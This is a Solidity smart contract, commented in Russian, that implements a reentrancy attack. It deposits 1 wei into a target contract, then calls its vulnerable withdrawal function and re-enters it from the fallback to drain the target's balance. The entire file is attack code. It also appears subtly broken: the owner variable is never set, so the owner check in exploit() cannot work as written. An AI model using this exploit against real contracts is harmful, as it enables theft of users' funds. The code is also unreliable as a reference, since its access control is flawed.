pragma solidity ^0.8.7;

interface ITarget {
	function vuln(uint256 amount) external;
	function deposit() external payable;
}

contract Attacker {
	ITarget private target;
	uint256 private victim_balance;
	address private owner;
	constructor(address _target) public payable { // вносим в контракт атакующего минимальный баланс в размере 1 wei.
		target = ITarget(_target);
	}
	function exploit() external {
		require(msg.sender == owner);
		target.deposit{value:1 wei}(); // вносим минимальный баланс
		victim_balance = address(target).balance; // получаем текущий баланс контракта в wei
		target.vuln(1); // начинаем атаку реетранси
	}
	fallback() external payable {
		require(msg.sender == address(target)); // запрещаем вызывать резервную функцию всем кроме контракта жертвы
		if (victim_balance != 0) { // если баланс не нулевой, декрементируем и повторно входим в vuln функцию
			victim_balance-=1;
			target.vuln(1);
		}
	}
}
